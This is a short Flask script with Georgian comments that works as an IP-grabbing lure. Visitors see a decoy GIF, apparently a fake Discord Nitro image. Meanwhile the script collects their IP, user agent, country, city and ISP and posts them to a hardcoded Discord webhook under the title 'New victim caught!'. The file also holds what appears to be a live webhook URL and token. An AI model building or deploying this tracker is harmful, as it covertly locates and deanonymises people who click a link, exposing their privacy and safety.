from flask import Flask, request, redirect
import requests
from datetime import datetime

app = Flask(__name__)

# !!! ჩასვი შენი ვებჰუკი აქ !!!
WEBHOOK_URL = "https://discord.com/api/webhooks/1562499370660663378/hgO_dPUrNm3gmTzMghArFVhAJcN60M-nV7DSWjd2M7aLYd0ALn7Ofga-sg3ZkSbfWvm4"

# აი ეს არის სურათის ლინკი, რომელსაც აჩვენებს (მაგ. შენი მემი)
IMAGE_URL = "https://imgs.search.brave.com/N8rzQeaHdA--kY7zz6tN8yxflRyDh2ljhVdNUmb5_ZI/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly9tZWRp/YTEudGVub3IuY29t/L20vZG5pZ3R0ZUtJ/TUFBQUFBZC9uaXRy/by1mYWtlLW5pdHJv/LmdpZg.gif" 

@app.route('/')
def log_ip():
    # ვიღებთ ვიზიტორის ინფორმაციას
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent')
    
    try:
        # ვიღებთ ლოკაციას IP-ს მიხედვით
        ip_info = requests.get(f"http://ip-api.com/json/{ip}").json()
        country = ip_info.get("country", "Unknown")
        city = ip_info.get("city", "Unknown")
        isp = ip_info.get("isp", "Unknown")
    except:
        country, city, isp = "Unknown", "Unknown", "Unknown"

    # ვაგზავნით დისქორდზე
    embed = {
        "title": "🎯 ახალი მსხვერპლი დაიჭირა!",
        "color": 0xff0000,
        "fields": [
            {"name": "🌐 IP მისამართი", "value": f"`{ip}`", "inline": False},
            {"name": "🏳️ ქვეყანა", "value": f"`{country}`", "inline": True},
            {"name": "🏙️ ქალაქი", "value": f"`{city}`", "inline": True},
            {"name": "📡 ინტერნეტი (ISP)", "value": f"`{isp}`", "inline": False},
            {"name": "🖥️ მოწყობილობა", "value": f"```{user_agent}```", "inline": False},
        ],
        "footer": {"text": f"დრო: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"}
    }
    
    try:
        requests.post(WEBHOOK_URL, json={"embeds": [embed]})
    except:
        pass

    # ვაბრუნებთ სურათს (ან ვაგზავნით სხვა საიტზე)
    return f'<html><body><img src="{IMAGE_URL}" style="width:100%; height:auto;"></body></html>'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)